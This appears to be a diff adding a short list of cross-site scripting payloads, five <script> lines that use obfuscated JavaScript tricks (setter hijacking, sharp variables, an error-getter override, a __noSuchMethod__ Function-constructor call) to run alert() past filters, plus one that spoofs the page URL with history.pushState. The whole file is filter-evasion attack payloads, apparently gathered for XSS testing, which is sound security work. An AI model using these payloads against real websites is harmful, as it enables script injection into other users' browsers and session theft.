@@ -1,0 +1,5 @@
+<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
